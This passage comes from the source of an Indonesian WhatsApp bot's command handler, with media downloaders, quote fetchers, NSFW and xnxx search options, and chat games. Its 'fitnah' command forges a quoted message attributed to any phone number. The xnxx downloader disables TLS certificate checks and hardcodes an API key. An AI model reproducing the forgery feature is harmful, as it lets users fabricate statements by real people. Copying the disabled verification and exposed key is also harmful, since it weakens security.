        await sych.sendMessage(m.chat, { 
            text: '⏳ Sedang memproses video...' 
        }, { quoted: fkontak });

        // Panggil API untuk mendapatkan link download
        const apiUrl = `https://api.zxcoderid.my.id/api/downloader/xnxx?url=${encodeURIComponent(text)}&apikey=lHW7OGsA67`;

        // Opsi untuk menonaktifkan verifikasi SSL
        const response = await fetch(apiUrl, {
            agent: new (require('https').Agent)({ rejectUnauthorized: false }) // Menonaktifkan verifikasi SSL
        });

        const data = await response.json();

        if (data.status !== "Success" || !data.data?.files) {
            await sych.sendMessage(m.chat, { 
                text: 'Gagal mendapatkan video. Coba lagi nanti!' 
            }, { quoted: fkontak });
            break;
        }

        // Ambil URL video dari hasil API
        const { files } = data.data;
        const videoUrls = {
            low: files.low,   // URL kualitas rendah
            high: files.high, // URL kualitas tinggi
            hls: files.HLS    // URL HLS (jika ada)
        };

        // Periksa jika URL video tersedia untuk masing-masing kualitas
        if (!videoUrls.low && !videoUrls.high && !videoUrls.hls) {
            await sych.sendMessage(m.chat, { 
                text: 'Gagal menemukan link video dengan kualitas yang tersedia.' 
            }, { quoted: fkontak });
            break;
        }

        // Membuat pesan dengan semua pilihan kualitas video
        let message = '🔽 Pilih kualitas video yang ingin diunduh:\n';
        
        if (videoUrls.low) {
            message += `- *Low Quality*: ${videoUrls.low}\n`;
        }
        if (videoUrls.high) {
            message += `- *High Quality*: ${videoUrls.high}\n`;
        }
        if (videoUrls.hls) {
            message += `- *HLS Quality*: ${videoUrls.hls}\n`;
        }

        // Kirimkan pesan ke chat dengan semua kualitas yang tersedia
        await sych.sendMessage(m.chat, { 
            text: message
        }, { quoted: fkontak });

    } catch (err) {
        console.error(err);
        await sych.sendMessage(m.chat, {
            text: `*Terjadi kesalahan!* 😭\n${err.message || err}`
        }, { quoted: fkontak });
    }
    break;
}
//xnxx
case 'xnxx': {
     
    if (!text) return sycreply(`Contoh: ${prefix + command} naruto`);
    sycreply(mess.wait, { quoted: fkontak });

    try {
        const axios = require('axios');
        const response = await axios.get(`https://api.zxcoderid.my.id/api/search/xnxx?q=${encodeURIComponent(text)}&apikey=lHW7OGsA67`);
        const { status, code, data } = response.data;

        if (status === 'Success' && code === 200 && data.status) {
            const hasil = data.result.slice(0, 15); // Ambil maksimal 15 hasil

            if (hasil.length === 0) return sycreply('Tidak ada hasil yang ditemukan!');

            // Buat carousel cards dari hasil pencarian
            const carouselCards = await Promise.all(hasil.map(async (xnxx, index) => ({
                header: {
                    title: `> ${xnxx.title || 'Tidak tersedia'}`,
                    hasMediaAttachment: true,
          imageMessage: (await generateWAMessageContent({
            image: {
              url: './src/media/sychy.png'
            }
          }, {
            upload: sych.waUploadToServer
          })).imageMessage
        },
                body: {
                    text: `> 📄 *Info:* ${xnxx.info.trim() || 'Tidak tersedia'}\n> 🔗 *Link:* ${xnxx.link}`
                },
                footer: {
                    text: `🔎 Hasil pencarian ke-${index + 1}`
                },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: "cta_url",
                            buttonParamsJson: JSON.stringify({
                                display_text: "Tonton xnxx",
                                url: xnxx.link
                            })
                        },
                        {
                            name: "cta_copy",
                            buttonParamsJson: JSON.stringify({
                                display_text: "Salin Link",
                                copy_code: xnxx.link
                            })
                        }
                    ]
                }
            })));

            // Generate carousel message
            const carouselMessage = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: { text: `*Hasil pencarian untuk:* _${text}_` },
                            footer: { text: "Powered by Langz" },
                            header: { hasMediaAttachment: false },
                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                cards: carouselCards
                            })
                        })
                    }
                }
            }, { quoted: fkontak });

            // Kirim pesan carousel
            await sych.relayMessage(m.chat, carouselMessage.message, { messageId: carouselMessage.key.id });

        } else {
            sycreply('⚠️ Tidak ada hasil yang ditemukan. Pastikan kata kunci benar.');
        }
    } catch (error) {
        console.error("Kesalahan saat mengirim carousel:", error);
        await sych.sendMessage(m.chat, {
            text: "Terjadi kesalahan saat mengambil data. Silakan coba lagi nanti."
        }, { quoted: m });
    }
    break;
}


case 'song': {
     
if (!text) return sycreply(`Example : ${prefix + command} anime whatsapp status`)
await sycreply(mess.wait);
let yts = require("youtube-yts")
        let look = await yts(text);
        let convert = look.videos[0];       
const pl = await youtube(convert.url)
await sych.sendMessage(m.chat,{
    audio: { url: pl.mp3  },
    fileName: convert.title + '.mp3',
    mimetype: 'audio/mpeg',
    contextInfo:{
        externalAdReply:{
            title:convert.title,
            body: botname,
            thumbnailUrl: convert.image,
            sourceUrl: pl.mp3,
            mediaType:1,
            mediaUrl:convert.url,
        }

    },
},{quoted:m})
sycreply('SORYY BRE KLO MB LAGUNYA GEDE SOALNYA BIAR JERNIH MUSIKNYA')
}
break
			case 'ig':
			case 'instagram':
			case 'instadl':
			case 'igdown':
			case 'igdl': {
				if (!text) return sycreply(`*< / >* Example: ${prefix + command} url_instagram`)
				if (!text.includes('instagram.com')) return sycreply('Url Tidak Mengandung Result Dari Instagram!')
				sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
				try {
					const hasil = await multiDownload(text);
					if (hasil.length < 0) return sycreply('Postingan Tidak Tersedia atau Privat!')
					for (let i = 0; i < hasil.length; i++) {
						await sych.sendFileUrl(m.chat, hasil[i].path, 'Done', m)
					}
				} catch (e) {
					try {
						let hasil = await fetchJson(api('hitori', '/download/instagram', {
							url: text
						}, 'apikey'))
						if (hasil.result.length < 0) return sycreply('Postingan Tidak Tersedia atau Privat!')
						for (let i = 0; i < hasil.result.length; i++) {
							await sych.sendFileUrl(m.chat, hasil.result[i].imageUrl, 'Done', m)
						}
					} catch (e) {
						sycreply('Postingan Tidak Tersedia atau Privat!')
					}
				}
			}
			break
			case 'getq': {
			     
    if (!m.quoted) return sycreply('Balas pesan yang ingin diambil datanya!');
    let quotedMessage = m.quoted;
    let messageContent = quotedMessage.msg || quotedMessage;
    let messageType = Object.keys(messageContent)[0];
    let messageData = {
        key: {
            remoteJid: quotedMessage.chat,
            participant: quotedMessage.sender,
            fromMe: quotedMessage.fromMe,
            id: quotedMessage.id,
        },
        message: messageContent,
    };
    sycreply(`Kode yang dihasilkan:\n\n` + monospace(JSON.stringify(messageData, null, 2)));
}
break;
			case 'igstory':
			case 'instagramstory':
			case 'instastory':
			case 'storyig': {
				if (!text) return sycreply(`*< / >* Example: ${prefix + command} usernamenya`)
				try {
					const hasil = await instaStory(text);
					sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
					for (let i = 0; i < hasil.results.length; i++) {
						await sych.sendFileUrl(m.chat, hasil.results[i].url, 'Done', m)
					}
				} catch (e) {
					sycreply('Username tidak ditemukan atau Privat!');
				}
			}
			break
			case 'tiktok':
			case 'tiktokdown':
			case 'ttdown':
			case 'ttdl':
			case 'tt':
			case 'ttmp4':
			case 'ttvideo':
			case 'tiktokmp4':
			case 'tiktokvideo': {
			     
				if (!text) {
					console.log('Teks URL TikTok tidak ditemukan.');
					return sycreply(`*< / >* Example: ${prefix + command} url_tiktok`);
				}
				if (!text.includes('tiktok.com')) {
					console.log('URL tidak valid, tidak mengandung hasil dari TikTok.');
					return sycreply('Url Tidak Mengandung Result Dari Tiktok!');
				}
				try {
					console.log('Memulai proses pengunduhan dari URL TikTok:', text);
					const hasil = await tiktokDl(text);
					sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
					console.log('Proses pengunduhan berhasil.');
					if (hasil && hasil.size_nowm) {
						console.log('Video tanpa watermark ditemukan.');
						await sych.sendFileUrl(m.chat, hasil.data[1].url, `*📍Title:* ${hasil.title}\n*⏳Duration:* ${hasil.duration}\n*🎃Author:* ${hasil.author.nickname} (@${hasil.author.fullname})`, m);
						await sych.sendMessage(m.chat, {
							react: {
								text: '🎵', // Emoji yang diinginkan
								key: m.key // Memberikan reaksi pada pesan perintah
							}
						});
					} else {
						console.log('Tidak ada video tanpa watermark, mengirimkan gambar...');
						for (let i = 0; i < hasil.data.length; i++) {
							console.log(`Mengirim gambar ke-${i + 1}.`);
							await sych.sendFileUrl(m.chat, hasil.data[i].url, `*🚀Image:* ${i + 1}`, m);
						}
					}
				} catch (e) {
					console.error('Gagal mengunduh atau URL tidak valid:', e);
					sycreply('Gagal/Url tidak valid!');
				}
			}
			break;
			case 'ttmp3':
			case 'tiktokmp3':
			case 'ttaudio':
			case 'tiktokaudio': {
			     
				if (!text) {
					console.log('Teks URL TikTok tidak ditemukan.');
					return sycreply(`*< / >* Example: ${prefix + command} url_tiktok`);
				}
				if (!text.includes('tiktok.com')) {
					console.log('URL tidak valid, tidak mengandung hasil dari TikTok.');
					return sycreply('Url Tidak Mengandung Result Dari Tiktok!');
				}
				try {
					console.log('Memulai proses pengunduhan audio dari URL TikTok:', text);
					const hasil = await tiktokDl(text);
					sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
					console.log('Proses pengunduhan berhasil, audio ditemukan.');
					// Mengirimkan pesan audio
					await sych.sendMessage(m.chat, {
						audio: {
							url: hasil.music_info.url
						},
						mimetype: 'audio/mpeg',
						ppt: true,
						contextInfo: {
							externalAdReply: {
								title: 'TikTok • ' + hasil.author.nickname,
								body: hasil.stats.likes + ' suka, ' + hasil.stats.comment + ' komentar. ' + hasil.title,
								previewType: 'PHOTO',
								thumbnailUrl: hasil.cover,
								mediaType: 1,
								renderLargerThumbnail: true,
								sourceUrl: text
							}
						}
					}, {
						quoted: m
					});
					await sych.sendMessage(m.chat, {
						react: {
							text: '🎶', // Emoji yang diinginkan
							key: m.key // Memberikan reaksi pada pesan perintah
						}
					});
					console.log('Audio berhasil dikirimkan dengan informasi terkait.');
				} catch (e) {
					console.error('Gagal mengunduh atau URL tidak valid:', e);
					sycreply('Gagal/Url tidak valid!');
				}
			}
			break;
			case 'fb':
			case 'fbdl':
			case 'fbdown':
			case 'facebook':
			case 'facebookdl':
			case 'facebookdown':
			case 'fbdownload':
			case 'fbmp4':
			case 'fbvideo': {
			     
				if (!text) return sycreply(`*< / >* Example: ${prefix + command} url_facebook`)
				if (!text.includes('facebook.com')) return sycreply('Url Tidak Mengandung Result Dari Facebook!')
				try {
					const hasil = await facebookDl(text);
					if (hasil.results.length < 1) {
						sycreply('Video Tidak ditemukan!')
					} else {
						sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
						await sych.sendFileUrl(m.chat, hasil.results[0].url, `*🎐Title:* ${hasil.caption}`, m);
					}
				} catch (e) {
					sycreply('Server downloader facebook sedang offline!')
				}
			}
			break
			case 'videymp4': {
			     
				if (!isPremium) return sycreply(mess.prem);
				if (!text) return sycreply(`*< / >* Example: ${prefix + command} url_videy`)
				if (!text.includes('videy.co')) return sycreply('Url Tidak Mengandung Hasil Dari Videy!')
				try {
					sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
					await sych.sendMessage(m.chat, {
						react: {
							text: "✅",
							key: m.key
						}
					});
					const apiUrl = `https://api.agatz.xyz/api/videydl?url=${text}`;
					const response = await fetch(apiUrl);
					const hasil = await response.json();
					if (hasil.status !== 200 || !hasil.data) {
						sycreply('Video Tidak ditemukan!')
					} else {
						await sych.sendFileUrl(m.chat, hasil.data, `*🎐Video Link:* ${hasil.data}`, m);
					}
				} catch (e) {
					sycreply('Server downloader Videy sedang offline!');
				}
			}
			break;
			case 'mediafire': {
			     
				if (!text) {
					console.log('URL tidak diberikan');
					return sycreply(`*< / >* Example: ${prefix + command} https://www.mediafire.com/file/xxxxxxxxx/xxxxx.zip/file`);
				}
				if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) {
					console.log('URL tidak valid: ' + args[0]);
					return sycreply('URL tidak valid!');
				}
				console.log('URL MediaFire yang valid diterima:', args[0]);
				try {
					console.log('Mencoba mengunduh dari MediaFire...');
					const anu = await mediafireDl(text);
					console.log('Unduhan berhasil:', anu.name, 'Ukuran:', anu.size);
					await sych.sendMedia(m.chat, anu.link, decodeURIComponent(anu.name), `*MEDIAFIRE DOWNLOADER*\n\n*${setv} Nama* : ${decodeURIComponent(anu.name)}\n*${setv} Ukuran* : ${anu.size}`, m);
					console.log('File berhasil dikirim ke chat:', m.chat);
					await sych.sendMessage(m.chat, {
						react: {
							text: '📚', // Emoji yang diinginkan
							key: m.key // Memberikan reaksi pada pesan perintah
						}
					});
				} catch (e) {
					console.log('Terjadi kesalahan saat mengunduh:', e);
					sycreply('Server download sedang offline!');
				}
			}
			break
			case 'spotifydl': {
				console.log("Proses mulai untuk command: spotifydl");
				// Cek apakah ada URL yang diberikan
				if (!text) {
					console.log("URL tidak diberikan. Mengirimkan contoh penggunaan.");
					return sycreply(`*< / >* Example: ${prefix + command} https://open.spotify.com/track/0JiVRyTJcJnmlwCZ854K4p`);
				}
				const reactEmojis = ["🎵", "🎶", "🔍", "🎶", "🎵", "✅"];
        for (const emoji of reactEmojis) {
            await sych.sendMessage(m.chat, {
                react: {
                    text: emoji,
                    key: m.key
                }
            });
        }
        
				// Validasi format URL
				if (!isUrl(args[0]) && !args[0].includes('open.spotify.com/track')) {
					console.log("URL tidak valid: " + args[0]);
					return sycreply('Url Invalid!');
				}
				try {
					// Coba kirim media dengan URL untuk mendownload
					console.log("Mencoba mengirim media dengan URL: " + 'https://spotifyapi.caliphdev.com/api/download/track?url=' + text);
					await sych.sendMedia(m.chat, 'https://spotifyapi.caliphdev.com/api/download/track?url=' + text, '', '', m);
					console.log("Media berhasil dikirim.");
					await sych.sendMessage(m.chat, {
						react: {
							text: '🔊', // Emoji yang diinginkan
							key: m.key // Memberikan reaksi pada pesan perintah
						}
					});
				} catch (e) {
					// Jika terjadi error (misalnya server offline)
					console.error("Terjadi kesalahan saat mencoba mengunduh: " + e.message);
					sycreply('Server download sedang offline!');
				}
			}
			break;
			// Quotes Menu
			case 'motivasi': {
			     
				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/kata-kata/motivasi.json'));
				sycreply(hasil)
			}
			break
			case 'bijak': {
			     
				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/kata-kata/bijak.json'));
				sycreply(hasil)
			}
			break
			case 'dare': {
			     
				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/kata-kata/dare.json'));
				sycreply(hasil)
			}
			break
			case 'quotes': {
			     
				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/kata-kata/quotes.json'));
				sycreply(`_${hasil.quotes}_\n\n*- ${hasil.author}*`)
			}
			break
			case 'truth': {
			     
				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/kata-kata/truth.json'));
				sycreply(`_${hasil}_`)
			}
			break
			case 'renungan': {
			     
				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/kata-kata/renungan.json'));
				sycreply('', {
					contextInfo: {
						forwardingScore: 10,
						isForwarded: true,
						externalAdReply: {
							title: (m.pushName || 'Anonim'),
							thumbnailUrl: hasil,
							mediaType: 1,
							previewType: 'PHOTO',
							renderLargerThumbnail: true,
							sourceUrl:  hasil
						}
					}
				});
			}
			break
			case 'bucin': {
			     
				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/kata-kata/bucin.json'));
				sycreply(hasil)
			}
			break
			// Random Menu
			case 'coffe':
			case 'kopi': {
				await sych.sendFileUrl(m.chat, 'https://coffee.alexflipnote.dev/random', '☕ Random Coffe', m)
			}
			break
			// Anime Menu
			case 'waifu': {
				try {
					if (text == 'nsfw') {
						const res = await fetchJson('https://api.waifu.pics/nsfw/waifu')
						await sych.sendFileUrl(m.chat, res.url, 'Random Waifu', m)
					} else {
						const res = await fetchJson('https://api.waifu.pics/sfw/waifu')
						await sych.sendFileUrl(m.chat, res.url, 'Random Waifu', m)
					}
				} catch (e) {
					sycreply('Server sedang offline!')
				}
			}
			break
			case 'neko': {
			     
				try {
					if (text == 'nsfw') {
						const res = await fetchJson('https://api.waifu.pics/nsfw/neko')
						await sych.sendFileUrl(m.chat, res.url, 'Random Waifu', m)
					} else {
						const res = await fetchJson('https://api.waifu.pics/sfw/neko')
						await sych.sendFileUrl(m.chat, res.url, 'Random Neko', m)
					}
				} catch (e) {
					sycreply('Server sedang offline!')
				}
			}
			break
			

			// Fun Menu
			case 'dadu': {
			     
				let ddsa = [{
					url: 'https://telegra.ph/file/9f60e4cdbeb79fc6aff7a.png',
					no: 1
				}, {
					url: 'https://telegra.ph/file/797f86e444755282374ef.png',
					no: 2
				}, {
					url: 'https://telegra.ph/file/970d2a7656ada7c579b69.png',
					no: 3
				}, {
					url: 'https://telegra.ph/file/0470d295e00ebe789fb4d.png',
					no: 4
				}, {
					url: 'https://telegra.ph/file/a9d7332e7ba1d1d26a2be.png',
					no: 5
				}, {
					url: 'https://telegra.ph/file/99dcd999991a79f9ba0c0.png',
					no: 6
				}];
				let media = pickRandom(ddsa);
				try {
					// Mengunduh gambar dari URL
					const response = await fetch(media.url);
					const buffer = await response.buffer();
					// Mengonversi gambar menjadi WebP menggunakan sharp
					const outputPath = './temp_sticker.webp';
					await sharp(buffer).webp().toFile(outputPath);
					// Mengirim gambar sebagai stiker
					await sych.sendAsSticker(m.chat, outputPath, m, {
						packname: packname,
						author: author,
						isAvatar: 1
					});
					// Menghapus file sementara setelah digunakan
					fs.unlinkSync(outputPath);
				} catch (err) {
					console.error('Terjadi kesalahan:', err);
					sycreply('Terjadi kesalahan saat mengirimkan stiker.');
				}
			}
			break;
			case 'halah':
			case 'hilih':
			case 'huluh':
			case 'heleh':
			case 'holoh': {
			     
				if (!m.quoted && !text) return sycreply(`Kirim/reply text dengan caption ${prefix + command}`)
				ter = command[1].toLowerCase()
				tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
				sycreply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
			}
			break
			case 'bisakah': {
			     
				if (!text) return sycreply(`*< / >* Example : ${prefix + command} saya menang?`)
				let bisa = ['Bisa', 'Coba Saja', 'Pasti Bisa', 'Mungkin Saja', 'Tidak Bisa', 'Tidak Mungkin', 'Coba Ulangi', 'Ngimpi kah?', 'yakin bisa?']
				let keh = bisa[Math.floor(Math.random() * bisa.length)]
				sycreply(`*Bisakah ${text}*\nJawab : ${keh}`)
			}
			break
			case 'apakah': {
			     
				if (!text) return sycreply(`*< / >* Example : ${prefix + command} saya bisa menang?`)
				let apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Coba Ulangi', 'Mungkin Saja', 'Mungkin Tidak', 'Mungkin Iya', 'Ntahlah']
				let kah = apa[Math.floor(Math.random() * apa.length)]
				sycreply(`*${command} ${text}*\nJawab : ${kah}`)
			}
			break
			case 'kapan':
			case 'kapankah': {
			     
				if (!text) return sycreply(`*< / >* Example : ${prefix + command} saya menang?`)
				let kapan = ['Besok', 'Lusa', 'Nanti', '4 Hari Lagi', '5 Hari Lagi', '6 Hari Lagi', '1 Minggu Lagi', '2 Minggu Lagi', '3 Minggu Lagi', '1 Bulan Lagi', '2 Bulan Lagi', '3 Bulan Lagi', '4 Bulan Lagi', '5 Bulan Lagi', '6 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', '6 Tahun Lagi', '1 Abad lagi', '3 Hari Lagi', 'Bulan Depan', 'Ntahlah', 'Tidak Akan Pernah']
				let koh = kapan[Math.floor(Math.random() * kapan.length)]
				sycreply(`*${command} ${text}*\nJawab : ${koh}`)
			}
			break
			case 'tanyakerang':
			case 'kerangajaib':
			case 'kerang': {
			     
				if (!text) return sycreply(`*< / >* Example : ${prefix + command} boleh pinjam 100?`)
				let krng = ['Mungkin suatu hari', 'Tidak juga', 'Tidak keduanya', 'Kurasa tidak', 'Ya', 'Tidak', 'Coba tanya lagi', 'Tidak ada']
				let jwb = pickRandom(krng)
				sycreply(`*Pertanyaan : ${text}*\n*Jawab : ${jwb}*`)
			}
			break
			case 'cekmati': {
			     
				if (!text) return sycreply(`*< / >* Example : ${prefix + command} nama lu`)
				let teksnya = text.replace(/[\uD800-\uDBFF][\uDC00-\uDFFF]/g, '').replace(/\d/g, '');
				let {
					data
				} = await axios.get(`https://api.agify.io/?name=${teksnya ? teksnya : 'bot'}`);
				sycreply(`Nama : ${text}\n*Mati Pada Umur :* ${data.age == null ? (Math.floor(Math.random() * 90) + 20) : data.age} Tahun.\n\n_Cepet Cepet Tobat Bro_\n_Soalnya Mati ga ada yang tau_`)
			}
			break
			case 'ceksifat': {
			     
				let sifat_a = ['Bijak', 'Sabar', 'Kreatif', 'Humoris', 'Mudah bergaul', 'Mandiri', 'Setia', 'Jujur', 'Dermawan', 'Idealis', 'Adil', 'Sopan', 'Tekun', 'Rajin', 'Pemaaf', 'Murah hati', 'Ceria', 'Percaya diri', 'Penyayang', 'Disiplin', 'Optimis', 'Berani', 'Bersyukur', 'Bertanggung jawab', 'Bisa diandalkan', 'Tenang', 'Kalem', 'Logis']
				let sifat_b = ['Sombong', 'Minder', 'Pendendam', 'Sensitif', 'Perfeksionis', 'Caper', 'Pelit', 'Egois', 'Pesimis', 'Penyendiri', 'Manipulatif', 'Labil', 'Penakut', 'Vulgar', 'Tidak setia', 'Pemalas', 'Kasar', 'Rumit', 'Boros', 'Keras kepala', 'Tidak bijak', 'Pembelot', 'Serakah', 'Tamak', 'Penggosip', 'Rasis', 'Ceroboh', 'Intoleran']
				let teks = `╭──❍「 *Cek Sifat* 」❍\n│• Sifat ${text && m.mentionedJid ? text : '@' + m.sender.split('@')[0]}${(text && m.mentionedJid ? '' : (`\n│• Nama : *${text ? text : m.pushName}*` || '\n│• Nama : *Tanpa Nama*'))}\n│• Orang yang : *${pickRandom(sifat_a)}*\n│• Kekurangan : *${pickRandom(sifat_b)}*\n│• Keberanian : *${Math.floor(Math.random() * 100)}%*\n│• Kepedulian : *${Math.floor(Math.random() * 100)}%*\n│• Kecemasan : *${Math.floor(Math.random() * 100)}%*\n│• Ketakutan : *${Math.floor(Math.random() * 100)}%*\n│• Akhlak Baik : *${Math.floor(Math.random() * 100)}%*\n│• Akhlak Buruk : *${Math.floor(Math.random() * 100)}%*\n╰──────❍`
				sycreply(teks)
			}
			break
			case 'cekkhodam': {
			     
				if (!text) return sycreply(`*< / >* Example : ${prefix + command} nama lu`);
				try {
					const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/random/cekkhodam.json'));
					// Validasi apakah hasil memiliki properti yang dibutuhkan
					if (hasil && hasil.nama && hasil.deskripsi) {
						sycreply(`Khodam dari *${text}* adalah *${hasil.nama}*\n_${hasil.deskripsi}_`);
					} else {
						sycreply('Maaf, data khodam tidak ditemukan atau sedang bermasalah.');
					}
				} catch (error) {
					console.error(error);
					sycreply('Terjadi kesalahan saat mengambil data khodam.');
				}
			}
			break;
			case 'jodohku': {
			     
				if (!m.isGroup) return sycreply(mess.group)
				let member = (store.groupMetadata[m.chat] ? store.groupMetadata[m.chat].participants : m.metadata.participants).map(a => a.id)
				let jodoh = pickRandom(member)
				sycreply(`👫Jodoh mu adalah\n@${m.sender.split('@')[0]} ❤ @${jodoh.split('@')[0]}`);
			}
			break
			case 'jadian': {
				if (!m.isGroup) return sycreply(mess.group)
				let member = (store.groupMetadata[m.chat] ? store.groupMetadata[m.chat].participants : m.metadata.participants).map(a => a.id)
				let jadian1 = pickRandom(member)
				let jadian2 = pickRandom(member)
				sycreply(`Ciee yang Jadian💖 Jangan lupa Donasi🗿\n@${jadian1.split('@')[0]} ❤ @${jadian2.split('@')[0]}`);
			}
			break
			case 'fitnah': {
				let [teks1, teks2, teks3] = text.split`|`
				if (!teks1 || !teks2 || !teks3) return sycreply(`*< / >* Example : ${prefix + command} pesan target|pesan mu|nomer/tag target`)
				let ftelo = {
					key: {
						fromMe: false,
						participant: teks3.replace(/[^0-9]/g, '') + '@s.whatsapp.net',
						...(m.isGroup ? {
							remoteJid: m.chat
						} : {
							remoteJid: teks3.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
						})
					},
					message: {
						conversation: teks1
					}
				}
				sych.sendMessage(m.chat, {
					text: teks2
				}, {
					quoted: ftelo
				});
			}
			break
			// Game Menu
			case 'slot': {
			     
				await gameSlot(sych, m, db)
			}
			break
			case 'casino': {
			     
				await gameCasinoSolo(sych, m, prefix, db)
			}
			break
			case 'rampok':
			case 'merampok': {
			     
				await gameMerampok(m, db)
			}
			break
			case 'begal': {
			     
				await gameBegal(sych, m, db)
			}
			break
			case 'suitpvp':
			case 'suit': {
			     
				let poin = 10
				let poin_lose = 10
				let timeout = 60000
				if (Object.values(suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) sycreply(`Selesaikan suit mu yang sebelumnya`)
				if (m.mentionedJid[0] === m.sender) return sycreply(`Tidak bisa bermain dengan diri sendiri !`)
				if (!m.mentionedJid[0]) return sycreply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[0]}`, m.chat, {
					mentions: [owner[1] + '@s.whatsapp.net']
				})
				if (Object.values(suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return sycreply(`Orang yang kamu tantang sedang bermain suit bersama orang lain :(`)
				let id = 'suit_' + new Date() * 1
				let caption = `_*SUIT PvP*_\n\n@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit\n\nSilahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
				suit[id] = {
					chat: sycreply(caption),
					id: id,
					p: m.sender,
					p2: m.mentionedJid[0],
					status: 'wait',
					waktu: setTimeout(() => {
						if (suit[id]) sycreply(`_Waktu suit habis_`)
						delete suit[id]
					}, 60000),
					poin,
					poin_lose,
					timeout
				}
			}
			break
			//[ *CASE AI JOKO SIJAWA* ]
			case "joko": {
			     
				if (!text) return sycreply("mau nanya apa sama joko\nExampel: .joko nama kamu siapa?")
				await sych.sendMessage(m.chat, {
					mimetype: 'audio/mp4',
					audio: {
						url: "https://api.siputzx.my.id/api/tools/tts?voice=jv-ID-DimasNeural&rate=0&pitch=0&volume=0&text=" + (await axios.get("https://api.siputzx.my.id/api/ai/joko?content=" + text)).data.data
					}
				}, {
					quoted: m
				});
			}
			break
			case 'ttc':
			case 'ttt':
			case 'tictactoe': {
			     
				let TicTacToe = require('./lib/tictactoe');
				if (Object.values(tictactoe).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return sycreply(`Kamu masih didalam game!\nKetik *${prefix}del${command}* Jika Ingin Mengakhiri sesi`);
				let room = Object.values(tictactoe).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
				if (room) {
					sycreply('Partner ditemukan!')
					room.o = m.chat
					room.game.playerO = m.sender
					room.state = 'PLAYING'
					let arr = room.game.render().map(v => {
						return {
							X: '❌',
							O: '⭕',
							1: '1️⃣',
							2: '2️⃣',
							3: '3️⃣',
							4: '4️⃣',
							5: '5️⃣',
							6: '6️⃣',
							7: '7️⃣',
							8: '8️⃣',
							9: '9️⃣'
						} [v]
					})
					let str = `Room ID: ${room.id}\n\n${arr.slice(0, 3).join('')}\n${arr.slice(3, 6).join('')}\n${arr.slice(6).join('')}\n\nMenunggu @${room.game.currentTurn.split('@')[0]}\n\nKetik *nyerah* untuk menyerah dan mengakui kekalahan`
					if (room.x !== room.o) await sych.sendMessage(room.x, {
						texr: str,
						mentions: parseMention(str)
					}, {
						quoted: m
					})
					await sych.sendMessage(room.o, {
						text: str,
						mentions: parseMention(str)
					}, {
						quoted: m
					})
				} else {
					room = {
						id: 'tictactoe-' + (+new Date),
						x: m.chat,
						o: '',
						game: new TicTacToe(m.sender, 'o'),
						state: 'WAITING',
						waktu: setTimeout(() => {
							if (tictactoe[roomnya.id]) sycreply(`_Waktu ${command} habis_`)
							delete tictactoe[roomnya.id]
						}, 300000)
					}
					if (text) room.name = text
					sych.sendMessage(m.chat, {
						text: 'Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''),
						mentions: m.mentionedJid
